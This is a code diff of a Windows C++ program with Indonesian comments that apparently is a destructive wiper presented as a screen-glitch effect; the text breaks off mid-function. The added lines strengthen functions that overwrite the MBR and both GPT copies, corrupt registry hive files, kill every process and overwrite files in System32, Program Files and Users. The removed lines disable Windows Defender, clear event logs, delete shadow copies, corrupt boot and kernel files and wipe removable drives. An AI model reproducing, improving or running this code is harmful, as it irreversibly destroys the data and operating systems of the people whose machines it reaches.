@@ -29,24 +29,38 @@
 #include <chrono>
 #include <condition_variable>
 #include <queue>
+#include <random>
+#include <wincrypt.h>
+#include <iphlpapi.h>
+#include <winhttp.h>
+#include <wtsapi32.h>
+#include <userenv.h>
+#include <lm.h>
+#include <ras.h>
+#include <raserror.h>
+#include <nb30.h>
+#include <sensapi.h>
+#include <wininet.h>
+#include <urlmon.h>
+#include <wincrypt.h>
+#include <dpapi.h>
+#include <wincrypt.h>
+#include <wintrust.h>
+#include <softpub.h>
+#include <mscat.h>
+#include <winscard.h>
+#include <ntsecapi.h>
+#include <dsgetdc.h>
+#include <aclui.h>
+#include <accctrl.h>
+#include <sddl.h>
+#include <wincrypt.h>
+#include <wincrypt.h>
+#include <wincrypt.h>
 
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "virtdisk.lib")
 #pragma comment(lib, "setupapi.lib")
-
-// Deklarasi untuk deteksi 64-bit
-typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
-typedef BOOL (WINAPI *LPFN_Wow64DisableWow64FsRedirection)(PVOID*);
-typedef BOOL (WINAPI *LPFN_Wow64RevertWow64FsRedirection)(PVOID);
-
-// Pragma handling for MinGW
-#ifdef __MINGW32__
-#define WINMM_LIB "winmm"
-#define USER32_LIB "user32"
-#define DWMWAPI_LIB "dwmapi"
-#define GDI32_LIB "gdi32"
-#define NTDLL_LIB "ntdll"
-#else
 #pragma comment(lib, "winmm.lib")
 #pragma comment(lib, "user32.lib")
 #pragma comment(lib, "dwmapi.lib")
@@ -54,13 +68,25 @@ typedef BOOL (WINAPI *LPFN_Wow64RevertWow64FsRedirection)(PVOID);
 #pragma comment(lib, "ntdll.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "advapi32.lib")
-#endif
+#pragma comment(lib, "iphlpapi.lib")
+#pragma comment(lib, "winhttp.lib")
+#pragma comment(lib, "wtsapi32.lib")
+#pragma comment(lib, "userenv.lib")
+#pragma comment(lib, "netapi32.lib")
+#pragma comment(lib, "rasapi32.lib")
+#pragma comment(lib, "sensapi.lib")
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "urlmon.lib")
+#pragma comment(lib, "wintrust.lib")
+#pragma comment(lib, "winscard.lib")
+#pragma comment(lib, "ntsecapi.lib")
+#pragma comment(lib, "secur32.lib")
 
 // Konfigurasi intensitas
-const int REFRESH_RATE = 3;  // Lebih cepat untuk efek lebih smooth
-const int MAX_GLITCH_INTENSITY = 10000;  // Meningkatkan intensitas maksimum
-const int GLITCH_LINES = 2000;  // Lebih banyak garis glitch
-const int MAX_GLITCH_BLOCKS = 1000;  // Lebih banyak blok glitch
+const int REFRESH_RATE = 2;  // Lebih cepat untuk efek lebih smooth
+const int MAX_GLITCH_INTENSITY = 15000;  // Meningkatkan intensitas maksimum
+const int GLITCH_LINES = 3000;  // Lebih banyak garis glitch
+const int MAX_GLITCH_BLOCKS = 1500;  // Lebih banyak blok glitch
 const int SOUND_CHANCE = 1;  // Lebih sering memainkan suara
 
 // Variabel global
@@ -114,7 +140,7 @@ std::mutex textMutex;
 std::atomic<bool> running(true);
 std::vector<std::thread> workerThreads;
 
-// ======== FUNGSI ADMIN DESTRUCTIVE ========
+// ======== FUNGSI DESTRUKSI YANG LEBIH KUAT ========
 BOOL IsRunAsAdmin() {
     BOOL fIsRunAsAdmin = FALSE;
     PSID pAdministratorsGroup = NULL;
@@ -127,15 +153,27 @@ BOOL IsRunAsAdmin() {
     return fIsRunAsAdmin;
 }
 
-void DestroyMBR() {
+void DestroyMBRWithPattern() {
     HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDrive == INVALID_HANDLE_VALUE) return;
 
-    // Overwrite first 100 sectors (50KB)
-    const DWORD bufferSize = 512 * 100;
+    // Overwrite first 200 sectors (100KB) dengan pattern khusus
+    const DWORD bufferSize = 512 * 200;
     BYTE* garbageBuffer = new BYTE[bufferSize];
+    
+    // Pattern khusus untuk membuat recovery lebih sulit
     for (DWORD i = 0; i < bufferSize; i++) {
-        garbageBuffer[i] = static_cast<BYTE>(rand() % 256);
+        if (i % 512 < 100) {
+            garbageBuffer[i] = 0xAA;  // Pattern khusus
+        } else if (i % 512 < 200) {
+            garbageBuffer[i] = 0x55;  // Pattern alternatif
+        } else if (i % 512 < 300) {
+            garbageBuffer[i] = 0xF0;  // Pattern ketiga
+        } else if (i % 512 < 400) {
+            garbageBuffer[i] = 0x0F;  // Pattern keempat
+        } else {
+            garbageBuffer[i] = static_cast<BYTE>(rand() % 256);  // Random untuk sisa
+        }
     }
 
     DWORD bytesWritten;
@@ -146,11 +184,11 @@ void DestroyMBR() {
     CloseHandle(hDrive);
 }
 
-void DestroyGPT() {
+void DestroyGPTCompletely() {
     HANDLE hDrive = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
     if (hDrive == INVALID_HANDLE_VALUE) return;
 
-    // Overwrite GPT header at LBA 1
+    // Overwrite GPT header at LBA 1 dan backup GPT di akhir disk
     const int gptHeaderSize = 512;
     BYTE* gptGarbage = new BYTE[gptHeaderSize];
     for (int i = 0; i < gptHeaderSize; i++) {
@@ -159,20 +197,43 @@ void DestroyGPT() {
 
     DWORD bytesWritten;
     LARGE_INTEGER offset;
+    
+    // Primary GPT Header
     offset.QuadPart = 512;  // LBA 1
     SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
     WriteFile(hDrive, gptGarbage, gptHeaderSize, &bytesWritten, NULL);
 
-    // Overwrite partition entries
+    // Backup GPT Header (di akhir disk)
+    DISK_GEOMETRY_EX dg = {0};
+    DWORD bytesReturned = 0;
+    if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
+        NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
+        LARGE_INTEGER diskSize = dg.DiskSize;
+        offset.QuadPart = diskSize.QuadPart - 512;  // Sektor terakhir
+        SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
+        WriteFile(hDrive, gptGarbage, gptHeaderSize, &bytesWritten, NULL);
+    }
+
+    // Overwrite semua partition entries
     const DWORD partitionEntriesSize = 512 * 128;  // 128 sectors
     BYTE* partitionGarbage = new BYTE[partitionEntriesSize];
     for (DWORD i = 0; i < partitionEntriesSize; i++) {
         partitionGarbage[i] = static_cast<BYTE>(rand() % 256);
     }
 
+    // Primary partition entries
     offset.QuadPart = 512 * 2;  // LBA 2
     SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
     WriteFile(hDrive, partitionGarbage, partitionEntriesSize, &bytesWritten, NULL);
+
+    // Backup partition entries (sebelum backup header)
+    if (DeviceIoControl(hDrive, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
+        NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
+        LARGE_INTEGER diskSize = dg.DiskSize;
+        offset.QuadPart = diskSize.QuadPart - 512 - partitionEntriesSize;  // Sebelum backup header
+        SetFilePointerEx(hDrive, offset, NULL, FILE_BEGIN);
+        WriteFile(hDrive, partitionGarbage, partitionEntriesSize, &bytesWritten, NULL);
+    }
 
     FlushFileBuffers(hDrive);
 
@@ -181,87 +242,106 @@ void DestroyGPT() {
     CloseHandle(hDrive);
 }
 
-void DestroyRegistry() {
-    const wchar_t* registryKeys[] = {
-        L"HKEY_LOCAL_MACHINE\\SOFTWARE",
-        L"HKEY_LOCAL_MACHINE\\SYSTEM",
-        L"HKEY_LOCAL_MACHINE\\SAM",
-        L"HKEY_LOCAL_MACHINE\\SECURITY",
-        L"HKEY_LOCAL_MACHINE\\HARDWARE",
-        L"HKEY_CURRENT_USER\\Software",
-        L"HKEY_CURRENT_USER\\System",
-        L"HKEY_USERS\\.DEFAULT"
+void DestroyRegistryCompletely() {
+    // Hapus seluruh registry hive secara sistematis
+    const wchar_t* registryHives[] = {
+        L"SAM",
+        L"SECURITY", 
+        L"SOFTWARE",
+        L"SYSTEM",
+        L"HARDWARE",
+        L"DEFAULT",
+        L"COMPONENTS",
+        L"BCD00000000"
     };
 
-    for (size_t i = 0; i < sizeof(registryKeys)/sizeof(registryKeys[0]); i++) {
-        HKEY hKey;
-        wchar_t subKey[256];
-        wchar_t rootKey[256];
+    for (size_t i = 0; i < sizeof(registryHives)/sizeof(registryHives[0]); i++) {
+        wchar_t hivePath[MAX_PATH];
+        wsprintfW(hivePath, L"C:\\Windows\\System32\\config\\%s", registryHives[i]);
         
-        // Split registry path
-        wchar_t* context = NULL;
-        wcscpy_s(rootKey, 256, wcstok_s((wchar_t*)registryKeys[i], L"\\", &context));
-        wcscpy_s(subKey, 256, context);
-        
-        HKEY hRoot;
-        if (wcscmp(rootKey, L"HKEY_LOCAL_MACHINE") == 0) hRoot = HKEY_LOCAL_MACHINE;
-        else if (wcscmp(rootKey, L"HKEY_CURRENT_USER") == 0) hRoot = HKEY_CURRENT_USER;
-        else if (wcscmp(rootKey, L"HKEY_USERS") == 0) hRoot = HKEY_USERS;
-        else continue;
-        
-        if (RegOpenKeyExW(hRoot, subKey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
-            // Delete all values
-            wchar_t valueName[16383];
-            DWORD valueNameSize;
-            DWORD iValue = 0;
-            
-            while (1) {
-                valueNameSize = 16383;
-                if (RegEnumValueW(hKey, iValue, valueName, &valueNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
-                RegDeleteValueW(hKey, valueName);
+        // Overwrite file hive dengan data acak
+        HANDLE hFile = CreateFileW(hivePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+        if (hFile != INVALID_HANDLE_VALUE) {
+            DWORD fileSize = GetFileSize(hFile, NULL);
+            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
+                BYTE* buffer = new BYTE[fileSize];
+                for (DWORD j = 0; j < fileSize; j++) {
+                    buffer[j] = static_cast<BYTE>(rand() % 256);
+                }
+                DWORD written;
+                WriteFile(hFile, buffer, fileSize, &written, NULL);
+                delete[] buffer;
             }
-            
-            // Delete all subkeys
-            wchar_t subkeyName[256];
-            DWORD subkeyNameSize;
-            
-            while (1) {
-                subkeyNameSize = 256;
-                if (RegEnumKeyExW(hKey, 0, subkeyName, &subkeyNameSize, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;
-                RegDeleteTreeW(hKey, subkeyName);
-            }
-            
-            RegCloseKey(hKey);
+            CloseHandle(hFile);
         }
+        
+        // Hapus file log
+        wchar_t logPath[MAX_PATH];
+        wsprintfW(logPath, L"C:\\Windows\\System32\\config\\%s.LOG", registryHives[i]);
+        DeleteFileW(logPath);
+        
+        wsprintfW(logPath, L"C:\\Windows\\System32\\config\\%s.LOG1", registryHives[i]);
+        DeleteFileW(logPath);
+        
+        wsprintfW(logPath, L"C:\\Windows\\System32\\config\\%s.LOG2", registryHives[i]);
+        DeleteFileW(logPath);
     }
 }
 
-void DisableCtrlAltDel() {
+void DisableAllSystemFeatures() {
     HKEY hKey;
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, 
-        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
-        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        DWORD value = 1;
-        RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-        RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-        RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-        RegCloseKey(hKey);
-    }
-
-    if (g_isAdmin) {
-        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
-            L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
-            0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+    
+    // Nonaktifkan semua fitur sistem
+    const wchar_t* policies[] = {
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer",
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\ActiveDesktop",
+        L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Ext",
+        L"Software\\Policies\\Microsoft\\Windows\\System",
+        L"Software\\Policies\\Microsoft\\Windows\\Explorer",
+        L"Software\\Policies\\Microsoft\\Windows\\Control Panel",
+        L"Software\\Policies\\Microsoft\\Windows\\Safer",
+    };
+    
+    for (size_t i = 0; i < sizeof(policies)/sizeof(policies[0]); i++) {
+        if (RegCreateKeyExW(HKEY_CURRENT_USER, policies[i], 0, NULL, 
+            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            
             DWORD value = 1;
-            RegSetValueExW(hKey, L"DisableTaskMgr", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-            RegSetValueExW(hKey, L"DisableChangePassword", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
-            RegSetValueExW(hKey, L"DisableLockWorkstation", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            // Nonaktifkan semua setting yang mungkin
+            RegSetValueExW(hKey, L"NoDispAppearancePage", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoDispBackgroundPage", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoDispCPL", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoDispScrSavPage", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoDispSettingsPage", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoVisualStyleChoice", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoColorChoice", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoSizeChoice", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"SetVisualStyle", 0, REG_SZ, (BYTE*)L"", sizeof(L""));
+            
+            RegCloseKey(hKey);
+        }
+        
+        if (g_isAdmin && RegCreateKeyExW(HKEY_LOCAL_MACHINE, policies[i], 0, NULL, 
+            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+            
+            DWORD value = 1;
+            RegSetValueExW(hKey, L"NoDispAppearancePage", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoDispBackgroundPage", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoDispCPL", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoDispScrSavPage", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoDispSettingsPage", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoVisualStyleChoice", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoColorChoice", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"NoSizeChoice", 0, REG_DWORD, (BYTE*)&value, sizeof(value));
+            RegSetValueExW(hKey, L"SetVisualStyle", 0, REG_SZ, (BYTE*)L"", sizeof(L""));
+            
             RegCloseKey(hKey);
         }
     }
 }
 
-void SetCriticalProcess() {
+void SetCriticalProcessPermanent() {
     typedef NTSTATUS(NTAPI* pRtlSetProcessIsCritical)(
         BOOLEAN bNew,
         BOOLEAN *pbOld,
@@ -275,280 +355,86 @@ void SetCriticalProcess() {
         if (RtlSetProcessIsCritical) {
             RtlSetProcessIsCritical(TRUE, NULL, FALSE);
         }
+        
+        // Juga set process sebagai protected
+        typedef NTSTATUS(NTAPI* pRtlSetProcessProtection)(IN OUT PVOID ProcessProtection, IN BOOLEAN SignerType, IN BOOLEAN SignatureSigner);
+        pRtlSetProcessProtection RtlSetProcessProtection = 
+            (pRtlSetProcessProtection)GetProcAddress(hNtDll, "RtlSetProcessProtection");
+            
+        if (RtlSetProcessProtection) {
+            PVOID protection = NULL;
+            RtlSetProcessProtection(&protection, TRUE, TRUE);
+        }
+        
         FreeLibrary(hNtDll);
     }
 }
 
-void KillCriticalProcesses();
-
-void BreakTaskManager() {
-    // Corrupt taskmgr.exe
-    const wchar_t* taskmgrPaths[] = {
-        L"C:\\Windows\\System32\\taskmgr.exe",
-        L"C:\\Windows\\SysWOW64\\taskmgr.exe"
-    };
-
-    for (size_t i = 0; i < sizeof(taskmgrPaths)/sizeof(taskmgrPaths[0]); i++) {
-        HANDLE hFile = CreateFileW(taskmgrPaths[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD fileSize = GetFileSize(hFile, NULL);
-            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                BYTE* buffer = new BYTE[fileSize];
-                if (buffer) {
-                    for (DWORD j = 0; j < fileSize; j++) {
-                        buffer[j] = rand() % 256;
-                    }
-                    DWORD written;
-                    WriteFile(hFile, buffer, fileSize, &written, NULL);
-                    delete[] buffer;
+void KillAllProcesses() {
+    DWORD processes[1024], cbNeeded;
+    if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
+        DWORD cProcesses = cbNeeded / sizeof(DWORD);
+        
+        for (DWORD i = 0; i < cProcesses; i++) {
+            if (processes[i] != 0 && processes[i] != GetCurrentProcessId()) {
+                HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, processes[i]);
+                if (hProcess) {
+                    TerminateProcess(hProcess, 0);
+                    CloseHandle(hProcess);
                 }
             }
-            CloseHandle(hFile);
         }
     }
-
-    // Kill existing task manager processes
-    KillCriticalProcesses();
 }
 
-// ============== DESTRUCTIVE FEATURES ==============
-void ClearEventLogs() {
-    const wchar_t* logs[] = {
-        L"Application", L"Security", L"System", L"Setup", 
-        L"ForwardedEvents", L"HardwareEvents"
+// ============== DESTRUCTIVE FEATURES YANG LEBIH KUAT ==============
+void WipeSystemFilesCompletely() {
+    const wchar_t* systemDirs[] = {
+        L"C:\\Windows\\System32",
+        L"C:\\Windows\\SysWOW64", 
+        L"C:\\Windows\\assembly",
+        L"C:\\Windows\\Microsoft.NET",
+        L"C:\\Program Files",
+        L"C:\\Program Files (x86)",
+        L"C:\\ProgramData",
+        L"C:\\Users"
     };
-    
-    for (int i = 0; i < sizeof(logs)/sizeof(logs[0]); i++) {
-        wchar_t command[256];
-        wsprintfW(command, L"wevtutil cl \"%s\"", logs[i]);
+
+    for (size_t i = 0; i < sizeof(systemDirs)/sizeof(systemDirs[0]); i++) {
+        WIN32_FIND_DATAW fd;
+        wchar_t searchPath[MAX_PATH];
+        wsprintfW(searchPath, L"%s\\*", systemDirs[i]);
         
-        STARTUPINFOW si = { sizeof(si) };
-        PROCESS_INFORMATION pi;
-        CreateProcessW(NULL, command, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-        WaitForSingleObject(pi.hProcess, 5000);
-        CloseHandle(pi.hThread);
-        CloseHandle(pi.hProcess);
-    }
-}
-
-void ClearShadowCopies() {
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
-    CreateProcessW(NULL, L"vssadmin delete shadows /all /quiet", 
-                 NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    WaitForSingleObject(pi.hProcess, 10000);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-}
-
-void WipeRemovableMedia() {
-    const int BUFFER_SIZE = 1024 * 1024; // 1MB buffer
-    BYTE* wipeBuffer = new BYTE[BUFFER_SIZE];
-    for (int i = 0; i < BUFFER_SIZE; i++) {
-        wipeBuffer[i] = rand() % 256;
-    }
-
-    wchar_t drives[128];
-    DWORD len = GetLogicalDriveStringsW(127, drives);
-    wchar_t* drive = drives;
-    
-    while (*drive) {
-        UINT type = GetDriveTypeW(drive);
-        if (type == DRIVE_REMOVABLE || type == DRIVE_CDROM) {
-            wchar_t devicePath[50];
-            wsprintfW(devicePath, L"\\\\.\\%c:", drive[0]);
-            
-            HANDLE hDevice = CreateFileW(devicePath, GENERIC_WRITE, 
-                FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
-            
-            if (hDevice != INVALID_HANDLE_VALUE) {
-                DISK_GEOMETRY_EX dg = {0};
-                DWORD bytesReturned = 0;
-                if (DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY_EX, 
-                    NULL, 0, &dg, sizeof(dg), &bytesReturned, NULL)) {
+        HANDLE hFind = FindFirstFileW(searchPath, &fd);
+        if (hFind != INVALID_HANDLE_VALUE) {
+            do {
+                if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
+                    wchar_t filePath[MAX_PATH];
+                    wsprintfW(filePath, L"%s\\%s", systemDirs[i], fd.cFileName);
                     
-                    LARGE_INTEGER diskSize = dg.DiskSize;
-                    LARGE_INTEGER totalWritten = {0};
-                    
-                    while (totalWritten.QuadPart < diskSize.QuadPart) {
-                        DWORD bytesToWrite = (diskSize.QuadPart - totalWritten.QuadPart > BUFFER_SIZE) 
-                            ? BUFFER_SIZE : diskSize.QuadPart - totalWritten.QuadPart;
-                        
-                        DWORD bytesWritten;
-                        WriteFile(hDevice, wipeBuffer, bytesToWrite, &bytesWritten, NULL);
-                        totalWritten.QuadPart += bytesWritten;
+                    HANDLE hFile = CreateFileW(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+                    if (hFile != INVALID_HANDLE_VALUE) {
+                        DWORD fileSize = GetFileSize(hFile, NULL);
+                        if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
+                            BYTE* buffer = new BYTE[fileSize];
+                            for (DWORD j = 0; j < fileSize; j++) {
+                                buffer[j] = static_cast<BYTE>(rand() % 256);
+                            }
+                            DWORD written;
+                            WriteFile(hFile, buffer, fileSize, &written, NULL);
+                            delete[] buffer;
+                        }
+                        CloseHandle(hFile);
                     }
                 }
-                CloseHandle(hDevice);
-            }
-        }
-        drive += wcslen(drive) + 1;
-    }
-    
-    delete[] wipeBuffer;
-}
-
-void CorruptBootFiles() {
-    const wchar_t* bootFiles[] = {
-        L"C:\\Windows\\Boot\\PCAT\\bootmgr",
-        L"C:\\Windows\\System32\\winload.exe",
-        L"C:\\Windows\\System32\\winresume.exe",
-        L"C:\\Windows\\System32\\bootres.dll",
-        L"C:\\Windows\\System32\\Boot\\bootres.dll"
-    };
-
-    for (int i = 0; i < sizeof(bootFiles)/sizeof(bootFiles[0]); i++) {
-        HANDLE hFile = CreateFileW(bootFiles[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD fileSize = GetFileSize(hFile, NULL);
-            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                BYTE* buffer = new BYTE[fileSize];
-                for (DWORD j = 0; j < fileSize; j++) {
-                    buffer[j] = rand() % 256;
-                }
-                DWORD written;
-                WriteFile(hFile, buffer, fileSize, &written, NULL);
-                delete[] buffer;
-            }
-            CloseHandle(hFile);
+            } while (FindNextFileW(hFind, &fd));
+            FindClose(hFind);
         }
     }
 }
 
-void CorruptKernelFiles() {
-    const wchar_t* kernelFiles[] = {
-        L"C:\\Windows\\System32\\ntoskrnl.exe",
-        L"C:\\Windows\\System32\\hal.dll",
-        L"C:\\Windows\\System32\\kdcom.dll",
-        L"C:\\Windows\\System32\\ci.dll"
-    };
-
-    for (int i = 0; i < sizeof(kernelFiles)/sizeof(kernelFiles[0]); i++) {
-        HANDLE hFile = CreateFileW(kernelFiles[i], GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-        if (hFile != INVALID_HANDLE_VALUE) {
-            DWORD fileSize = GetFileSize(hFile, NULL);
-            if (fileSize != INVALID_FILE_SIZE && fileSize > 0) {
-                BYTE* buffer = new BYTE[fileSize];
-                for (DWORD j = 0; j < fileSize; j++) {
-                    buffer[j] = rand() % 256;
-                }
-                DWORD written;
-                WriteFile(hFile, buffer, fileSize, &written, NULL);
-                delete[] buffer;
-            }
-            CloseHandle(hFile);
-        }
-    }
-}
-
-void DisableWindowsDefender() {
-    // Layer 1: Stop services
-    SC_HANDLE scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
-    if (scm) {
-        const wchar_t* services[] = {
-            L"WinDefend", L"WdNisSvc", L"SecurityHealthService", L"wscsvc"
-        };
-        
-        for (int i = 0; i < sizeof(services)/sizeof(services[0]); i++) {
-            SC_HANDLE service = OpenServiceW(scm, services[i], SERVICE_ALL_ACCESS);
-            if (service) {
-                SERVICE_STATUS status;
-                ControlService(service, SERVICE_CONTROL_STOP, &status);
-                CloseServiceHandle(service);
-            }
-        }
-        CloseServiceHandle(scm);
-    }
-
-    // Layer 2: Disable via registry
-    HKEY hKey;
-    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
-        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender", 
-        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        DWORD disable = 1;
-        RegSetValueExW(hKey, L"DisableAntiSpyware", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-        RegSetValueExW(hKey, L"DisableAntiVirus", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-        RegCloseKey(hKey);
-    }
-
-    // Layer 3: Disable real-time protection
-    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
-        L"SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", 
-        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        DWORD disable = 0;
-        RegSetValueExW(hKey, L"DisableRealtimeMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-        RegSetValueExW(hKey, L"DisableBehaviorMonitoring", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-        RegSetValueExW(hKey, L"DisableOnAccessProtection", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-        RegSetValueExW(hKey, L"DisableScanOnRealtimeEnable", 0, REG_DWORD, (BYTE*)&disable, sizeof(disable));
-        RegCloseKey(hKey);
-    }
-
-    // Layer 4: Disable scheduled tasks
-    STARTUPINFOW si = { sizeof(si) };
-    PROCESS_INFORMATION pi;
-    CreateProcessW(NULL, 
-        L"schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /DISABLE",
-        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    WaitForSingleObject(pi.hProcess, 5000);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    
-    CreateProcessW(NULL, 
-        L"schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /DISABLE",
-        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    WaitForSingleObject(pi.hProcess, 5000);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    
-    CreateProcessW(NULL, 
-        L"schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /DISABLE",
-        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    WaitForSingleObject(pi.hProcess, 5000);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-    
-    CreateProcessW(NULL, 
-        L"schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /DISABLE",
-        NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
-    WaitForSingleObject(pi.hProcess, 5000);
-    CloseHandle(pi.hThread);
-    CloseHandle(pi.hProcess);
-}
-
-void SetCustomBootFailure() {
-    HKEY hKey;
-    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
-        L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", 
-        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        
-        HKEY subKey;
-        if (RegCreateKeyExW(hKey, L"winlogon.exe", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &subKey, NULL) == ERROR_SUCCESS) {
-            wchar_t debugger[] = L"cmd.exe /c \"echo CRITICAL SYSTEM FAILURE && echo Bootloader corrupted && pause\"";
-            RegSetValueExW(subKey, L"Debugger", 0, REG_SZ, (BYTE*)debugger, (wcslen(debugger) + 1) * sizeof(wchar_t));
-            RegCloseKey(subKey);
-        }
-        RegCloseKey(hKey);
-    }
-
-    // Set custom shutdown message
-    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, 
-        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 
-        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
